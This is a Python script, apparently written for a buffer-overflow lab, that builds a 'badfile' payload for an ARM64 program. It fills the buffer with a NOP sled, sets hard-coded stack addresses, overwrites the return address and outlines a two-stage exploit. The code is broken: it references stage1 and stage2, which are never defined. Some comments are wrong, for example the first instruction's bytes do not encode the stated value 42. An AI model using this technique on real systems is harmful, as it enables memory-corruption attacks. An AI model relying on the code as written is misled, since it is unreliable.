#!/usr/bin/python3
import sys

# TEST: Minimal shellcode that fits in 40 bytes - exit(42)
# This tests if the exploit works at all
shellcode = (
    "\xa0\x05\x80\xd2"  # mov x0, #42
    "\xa8\x0b\x80\xd2"  # mov x8, #93 (exit syscall)
    "\x01\x00\x00\xd4"  # svc #0
).encode('latin-1')

# Fill with NOPs (0xD503201F is NOP instruction in ARM64)
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(517/4)):
    content[offset*4:offset*4 + 4] = nop

##################################################################
buffer_addr = 0x0000fffffffff320       # ✩ Need to change ✩
foo_frame_pointer = 0x0000fffffffff340 # ✩ Need to change ✩

# TWO-STAGE exploit:
# Stage 1 (20 bytes) gets copied by strcpy, scans for 0xaa marker
# Stage 2 (full shellcode) placed at high offset, has 0xaa marker

# Place stage1 at offset 0 (gets copied to buffer by strcpy)
content[0:len(stage1)] = stage1

# Place stage2 at high offset (remains in original 517-byte input)
stage2_offset = 300
content[stage2_offset:stage2_offset + len(stage2)] = stage2

offset_to_ret = (foo_frame_pointer + 8) - buffer_addr

# Return address points to buffer_addr where stage1 now lives
ret = buffer_addr

if offset_to_ret < 0 or offset_to_ret + 8 > len(content):
    print(f"Error: Invalid offset {offset_to_ret}")
    sys.exit(1)

# strcpy copies stage1, then stops at null in return address
content[offset_to_ret:offset_to_ret + 8] = ret.to_bytes(8, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
